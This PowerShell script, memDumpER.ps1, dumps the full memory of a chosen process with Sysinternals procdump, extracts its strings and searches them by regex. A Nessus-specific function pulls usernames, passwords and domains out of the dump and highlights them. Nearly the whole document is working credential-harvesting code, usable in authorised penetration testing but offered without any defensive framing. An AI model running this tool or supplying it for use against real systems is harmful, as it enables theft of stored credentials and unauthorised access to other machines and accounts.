####################################################################################
# 
# memDumpER.ps1 
# Find process, Dump memory, search for shit 
#
# Description 
#
# Example 
#	 .\memDumpER.ps1 -proc 'ProcessName' -search '^regExpression$'
#
# Author: CbHu3
#
####################################################################################

[CmdletBinding()]
Param ($proc,$search, [String] $OutputDelimiter = "`n")
$DebugPreference = "Continue"


If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
		Write-Warning "This is not an Administrator session ..."
        Break
    }
	
$global:sw = [Diagnostics.Stopwatch]::StartNew()

# Woriking Directory
$scriptpath = $MyInvocation.MyCommand.Path
$dir = Split-Path $scriptpath
pushd $dir
Write-host "My directory is $dir"

$dest = $dir + "\Dump\"
if (!(Test-Path $dest)) { mkdir $dest -Force }

# We are using sysinternals to dump so we have to check for some tools
$pDump = $dir + "\procdump.exe"
if (!(Test-Path $pDump)) {
    Write-Host -NoNewline "$pDump not found ... looking in other places ... "
    $Dump = Get-Childitem –Path C:\ -filter procdump.exe -Recurse -ErrorAction SilentlyContinue | Select-Object Directory -First 1
	#$Dump = Get-Childitem –Path C:\ -filter procdump.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 { $place_path = $_.directory; echo "${place_path}\${_}"}
    if ($Dump.count -eq 0) {
        Write-Host "$pDump not found!!! Exiting ..." -foregroundcolor red -backgroundcolor black
        popd
        Exit
    }
    else {
		$pDump = $Dump.directory.ToString() + "\procdump.exe"
		Write-Host "Ok found one here: $pDump"
		}
}

$sOut = $dir + "\strings.exe"
if (!(Test-Path $sOut)) {
    Write-Host -NoNewline "$sOut not found ... looking in other places ... "
    $Out = Get-Childitem –Path C:\ -filter strings.exe -Recurse -ErrorAction SilentlyContinue | Select-Object Directory -First 1
    if ($Out.count -eq 0) {
        Write-Host "$sOut not found!!! Exiting ..." -foregroundcolor red -backgroundcolor black
        popd
        Exit
    }
    else { 
		$sOut = $Out.directory.ToString() + "\strings.exe"
		Write-Host "Ok found one here: $sOut"
		}
}

Write-Debug  "$($sw.Elapsed) Dumping process $Proc using $pDump"

$procID = (Get-Process $Proc | select -expand id)
if ($procID.count -eq 0) {Write-Host "$Proc is not found!!! Exiting ..." -foregroundcolor red -backgroundcolor black; Exit }
$a1 = '-ma'
$a2 = '-accepteula'
$a3 = '-o'
$dFile = 'memDump_' + $Proc.ToString() +'_' + [int64](([datetime]::UtcNow)-(get-date "1/1/1970")).TotalSeconds +'.dmp'
$dumpDest = $dest + $dFile 
cmd /c $pDump $a1 $a2 $a3 $procID $dumpDest

# Now we need to get the strings of the file
Write-Debug  "$($sw.Elapsed) Stringing using $sOut"
$a1 = '-accepteula'
$sFile = 'memDump_' + $Proc.ToString() +'_' + [int64](([datetime]::UtcNow)-(get-date "1/1/1970")).TotalSeconds +'.txt'
$stringDest = $dest + $sFile
cmd /c $sOut $a1 $dumpDest 1> $stringDest

# Search for usernames
Write-Debug  "$($sw.Elapsed) Searching for $search in $stringDest"

# This is the nessus string 
#$UnP = Select-String -Path $stringDest -Pattern '{"uuid":"' | Out-String

$UnP = Select-String -Path $stringDest -Pattern $search -Context 3| Out-String

Write-Output $UnP

# Need to call this if the process is Nessus
function nessusCreds {
	$UnP | foreach {
		($unP.Split(",")) | foreach {
			if ($_ -match '^"username"') {
				Write-Output "++++++++++++++++++++++++++++++++++++++++++++++"
				Write-Host "$_" -foregroundcolor green -backgroundcolor black
			}
			if ($_ -match '^"password"') {
				Write-Host "$_" -foregroundcolor red -backgroundcolor black
			}
			if ($_ -match '^"domain"') {
				Write-Host  $_.Trim("}","]") -foregroundcolor green -backgroundcolor black
			}
			if ($_ -match $search) {
				Write-Host  $_.Trim("}","]") -foregroundcolor green -backgroundcolor black
			}
			#else {
			#	Write-Host  $_.Trim("}","]") 
			#}
		}
	}
}

Write-Output "++++++++++++++++++++++++++++++++++++++++++++++"
popd
$sw.Stop()
